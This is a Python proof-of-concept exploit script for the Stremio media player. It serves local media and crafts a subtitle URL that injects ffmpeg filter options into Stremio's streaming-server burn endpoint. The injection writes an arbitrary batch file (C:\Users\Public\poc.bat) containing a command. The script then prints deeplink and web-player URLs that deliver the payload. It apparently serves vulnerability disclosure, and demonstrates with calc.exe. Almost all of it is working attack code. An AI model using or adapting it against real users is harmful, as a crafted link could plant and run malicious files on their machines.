# Run via python poc.py

import base64
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from html import escape
import json
from pathlib import Path
from time import time
from urllib.parse import quote, urlencode
import zlib

STREMIO = "http://127.0.0.1:11470" 
MEDIA = f"http://127.0.0.1:18768"

WRITE_PATH = Path(r"C:\Users\Public\poc.bat")
COMMAND = "calc.exe"

SUBTITLE = (f"{MEDIA}/base.srt'" f",metadata=mode=add:key='{COMMAND} & exit':value=value" f",metadata=mode=print:file='{WRITE_PATH.as_posix()}")
BURN_URL = f"{STREMIO}/hlsv2/poc-{int(time())}/burn?" + urlencode({"mediaURL": f"{MEDIA}/base.mp4", "url": SUBTITLE, "forceTranscoding": "1"})
STREAM = {"name": "Arbitrary Write POC", "url": BURN_URL}

class MediaHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.serve(True)

    def do_HEAD(self):
        self.serve(False)

    def serve(self, send_body):
        filename = self.path.split("?", 1)[0].lstrip("/")
        data = ((Path(__file__).resolve().parent) / filename).read_bytes()
        start, end = 0, len(data) - 1
        byte_range = self.headers.get("Range", "")
        if byte_range.startswith("bytes="):
            first, _, last = byte_range[6:].partition("-")
            start = int(first) if first else 0
            end = min(int(last), end) if last else end
        self.send_response(206 if byte_range else 200)
        self.send_header("Content-Type", "video/mp4" if filename.endswith(".mp4") else "application/x-subrip")
        self.send_header("Accept-Ranges", "bytes")
        self.send_header("Content-Length", str(end - start + 1))
        if byte_range:
            self.send_header("Content-Range", f"bytes {start}-{end}/{len(data)}")
        self.end_headers()
        if send_body:
            self.wfile.write(data[start:end + 1])


def main():
    server = ThreadingHTTPServer(("127.0.0.1", 18768), MediaHandler)
    PAYLOAD = quote(base64.b64encode(zlib.compress(json.dumps(STREAM).encode(), 0)).decode(), safe="")
    DEEPLINK = "stremio:///player/" + PAYLOAD
    WEB_URL = "https://web.stremio.com/#/player/" + PAYLOAD
    try:
        print("This POC writes to the window's public folder a poc.bat that, once ran, opens calc.exe.")
        print(f"Stremio deeplink: {DEEPLINK}\n")
        print(f"Web player URL: {WEB_URL}")
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
